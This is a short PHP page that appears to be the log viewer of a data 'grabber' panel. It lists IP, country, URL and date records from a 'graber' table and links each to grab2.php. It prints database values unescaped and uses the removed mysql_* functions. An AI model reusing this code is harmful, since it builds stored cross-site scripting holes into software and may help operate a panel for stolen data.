<!DOCTYPE html>
<html lang="en">

<head>
  <link rel="stylesheet" href="css/screen.css" type="text/css" media="screen">
  <link rel="stylesheet" href="css/buttons.css" type="text/css" media="screen">
</head><?php
include("config.php");
include ("auth.php");

if (! $connect) die(mysql_error());
mysql_select_db($dbname , $connect) or die("Couldn't open $db: ".mysql_error());
$result = mysql_query( "SELECT * FROM  `graber`" )
          or die("SELECT Error: ".mysql_error());
$num_rows = mysql_num_rows($result);
print "<center>There are $num_rows <b>Report's</b> found.<br>";

 

echo "<center><table border='7'>
<tr border='7'> 
<th>IP</th>
<th>Country</th>
<th>URL</th>
<th>DATE</th>
</tr>";
while($row = mysql_fetch_array($result))
{
	

	echo "<tr border='7'>";
	echo "<td>" . $row['ip'] . "</td>";
	echo "<td>" . $row['contry'] . "</td>";
	echo "<td><a href='grab2.php?site=" .$row['id'].  "'>". $row['url'] ."</a></td>";
	echo "<td>" . $row['time'] . "</td>";
	echo "</tr>";
		
}
echo "</table></center>";

mysql_close($connect);



?>
<form><button><a href="a.php">Go Back</a></form></button>
<html>
<BODY 
    BACKGROUND="images/paper.gif"
    BGCOLOR="#FFFFFF"
    TEXT="#000000"
    LINK="#0000FF"
    VLINK="#FF66FF"
    ALINK="#FF0000"
    >


</html>